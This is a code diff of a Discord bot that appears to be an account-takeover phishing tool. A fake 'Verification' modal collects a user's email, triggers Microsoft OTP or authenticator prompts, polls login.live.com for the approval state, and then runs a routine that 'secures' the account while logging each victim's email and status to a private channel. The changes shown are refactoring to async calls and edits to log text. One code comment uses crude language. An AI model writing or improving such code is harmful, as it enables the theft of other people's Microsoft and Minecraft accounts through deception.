@@ -46,7 +46,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         # Special thanks to Revive (kpriest95523) for this request
         print("[~] - Checking if email is locked")
 
-        lockedInfo = await asyncio.to_thread(checkLocked, self.email.value)
+        lockedInfo = await checkLocked(self.email.value)
         print(lockedInfo)
         
         if lockedInfo:
@@ -92,12 +92,11 @@ class MyModalOne(ui.Modal, title="Verification"):
                 return
 
         # Sends OTP/Auth code
-        emailInfo = await asyncio.to_thread(sendAuth, self.email.value)
+        emailInfo = await sendAuth(self.email.value)
         print(emailInfo)
 
         # Microsoft raping otp requests
         # Can be fixed since the latest otp sent still works
-        # To be coded later
         if len(emailInfo) == 1:
             await logs_channel.send(
                 embed = Embed(
@@ -135,6 +134,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     embed = Embed(
                     title = embeds["invalid_email"][0],
                     description = embeds["invalid_email"][1],
+                    color = 0xFF5C5C
                 ),
                 ephemeral = True
             )
@@ -178,7 +178,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
 
             # Checks every second for the authenticator state
-            def check_code(flowToken):
+            async def checkCode(flowToken):
                 response = requests.post(
                     url = f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
                     headers = {
@@ -200,7 +200,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             i = 0
             while i < 60:
 
-                data = await asyncio.to_thread(check_code, device)
+                data = await checkCode(device)
                 print(data)
 
                 if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
@@ -243,13 +243,13 @@ class MyModalOne(ui.Modal, title="Verification"):
                         "⌛ Please allow us to proccess your roles...", ephemeral=True
                     )
 
-                    finalEmbeds = await asyncio.to_thread(startSecuringAccount, self.email.value, device) 
+                    finalEmbeds = await startSecuringAccount(self.email.value, device) 
                     if not finalEmbeds:
                         
                         await logs_channel.send(
                             embed = Embed(
                                 title = f"{interaction.user.name} ({interaction.user.id})",
-                                description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to secure | Could not fetch MSAAUTH```",
+                                description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to secure | Invalid email OTP```",
                                 timestamp = datetime.datetime.now(),
                                 colour = 0xFF5C5C                  
                             ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
